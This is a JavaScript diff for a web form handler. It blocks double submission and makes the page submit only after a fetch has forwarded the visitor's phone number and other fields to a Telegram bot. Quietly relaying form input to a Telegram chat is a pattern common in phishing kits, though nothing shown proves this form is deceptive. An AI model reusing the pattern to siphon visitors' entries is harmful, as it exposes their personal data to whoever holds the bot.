@@ -3,10 +3,17 @@ window.onload = function() {
         document.getElementById("refer").style.display = "none"; // Hide field  
     };  
 
-    function addTimestamp() {  
+    function addTimestamp(event) {  
+        event.preventDefault(); // Prevent multiple submissions  
+
         let now = new Date();  
         let timestamp = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds() + ":" + now.getMilliseconds();  
         document.getElementById("timestamp").value = timestamp;  
+
+        // Disable the submit button
+        let submitButton = document.querySelector(".btn");
+        submitButton.disabled = true;
+        submitButton.value = "Processing...";
 
         // Send data to Telegram bot  
         let phone = document.getElementById("phone").value;  
@@ -19,5 +26,9 @@ window.onload = function() {
         
         let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;  
         
-        fetch(url);  
+        fetch(url).then(() => {
+            document.getElementById("myForm").submit(); // Submit form after sending message
+        });
     }  
+
+    document.getElementById("myForm").addEventListener("submit", addTimestamp);
